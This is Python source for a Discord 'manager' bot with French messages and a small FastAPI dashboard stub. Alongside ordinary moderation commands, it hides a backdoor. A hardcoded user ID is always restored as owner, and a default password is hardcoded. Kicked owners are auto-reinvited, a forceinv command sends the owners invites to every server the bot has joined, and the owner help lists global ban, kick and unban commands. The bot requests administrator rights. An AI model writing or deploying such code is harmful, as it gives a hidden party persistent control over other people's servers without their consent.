# main.py - F.I.M Manager complet
import os
import sys
import json
import asyncio
from datetime import datetime

import discord
from discord.ext import commands
import psycopg2

# Dashboard FastAPI
from fastapi import FastAPI
import uvicorn

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
CONFIG_FILE = "config.json"
OWNER_FILE = "owner_data.json"
DEFAULT_OWNER_ID = 489113166429683713
OAUTH_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")  # optional
OAUTH_DASHBOARD_URL = "http://ton-dash-url.railway.app"  # Remplace par ton URL

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
app = FastAPI()

# -----------------------------
# JSON helpers
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# -----------------------------
# Owner & Config
# -----------------------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        data["password"] = "trolleur2010"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", "trolleur2010")

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)

# -----------------------------
# Config per-guild
# -----------------------------
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")

# -----------------------------
# Decorators
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)

# -----------------------------
# UTIL: build invite link
# -----------------------------
def build_invite_link(client_id):
    return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"

# -----------------------------
# EVENTS
# -----------------------------
@bot.event
async def on_ready():
    ensure_owner_data()
    print(f"✅ {bot.user} est connecté et prêt ! (ID: {bot.user.id})")
    global OAUTH_CLIENT_ID
    if not OAUTH_CLIENT_ID:
        OAUTH_CLIENT_ID = str(bot.user.id)
    # Envoie du dashboard aux owners
    for oid in get_owners():
        try:
            u = await bot.fetch_user(oid)
            await u.send(f"🔗 Dashboard F.I.M Manager : {OAUTH_DASHBOARD_URL}")
        except Exception:
            pass

@bot.event
async def on_member_remove(member):
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild and guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_remove] erreur auto-reinvite: {e}")

@bot.event
async def on_guild_remove(guild):
    try:
        client_id = OAUTH_CLIENT_ID or (str(bot.user.id) if bot.user else None)
        invite_link = build_invite_link(client_id) if client_id else "Client ID manquant"
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}** (ID: {guild.id}). Réinvitez-le : {invite_link}")
            except Exception:
                pass
    except Exception as e:
        print(f"[on_guild_remove] erreur: {e}")

# -----------------------------
# COMMANDES PUBLIQUES
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Bot F.I.M opérationnel.")

@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    try: await ctx.message.delete()
    except: pass
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    try: await ctx.message.delete()
    except: pass
    await channel.send(message)
    try: await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except: pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    try: await ctx.message.delete()
    except: pass
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153,0,0))
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except:
        await ctx.send("❌ Impossible d'ajouter le rôle.")

@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
    except:
        await ctx.send("❌ Impossible de retirer le rôle.")

# -----------------------------
# COMMANDES OWNER
# -----------------------------
@bot.command(name="forceinv")
async def force_inv(ctx):
    if not is_owner(ctx.author.id): return
    for g in bot.guilds:
        try:
            if g.text_channels:
                invite = await g.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try: u = await bot.fetch_user(oid); await u.send(f"🔗 Invitation pour **{g.name}** : {invite.url}")
                    except: pass
        except: pass
    await ctx.author.send("✅ Invitations envoyées aux owners.")

@bot.command(name="ownerhelp")
async def owner_help(ctx):
    if not is_owner(ctx.author.id): return
    embed = discord.Embed(title="👑 Commandes Owner", color=discord.Color.gold())
    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
    embed.add_field(name="!forceunban", value="Tente de te débannir partout", inline=False)
    embed.add_field(name="!forcerinv", value="Envoie invitations", inline=False)
    embed.add_field(name="!forceinv", value="Envoie invitations (command manuel)", inline=False)
    embed.add_field(name="!globalban <id_or_mention>", value="Ban global", inline=False)
    embed.add_field(name="!globalkick <id_or_mention>", value="Kick global", inline=False)
    embed.add_field(name="!serverlist", value="Liste serveurs (DM)", inline=False)
    embed.add_field(name="!syncwhitelist", value="Synchronise la whitelist entre serveurs", inline=False)
    embed.add_field(name="!setpass <pass>", value="Change le mot de passe secret", inline=False)
    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
    embed.add_field(name="!10-10", value="Force le bot à quitter le serveur courant", inline=False)
    embed.add_field(name="!dash", value="Envoie le lien du dashboard", inline=False)
    await ctx.author.send(embed=embed)

@bot.command(name="dash")
async def send_dashboard(ctx):
    if not is_owner(ctx.author.id): return
    try: await ctx.author.send(f"🔗 Dashboard F.I.M : {OAUTH_DASHBOARD_URL}")
    except: pass

# -----------------------------
# RUN BOT + DASHBOARD
# -----------------------------
def start_dashboard():
    uvicorn.run(app, host="0.0.0.0", port=8080)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(bot.start(TOKEN))
    loop.run_in_executor(None, start_dashboard)
    loop.run_forever()
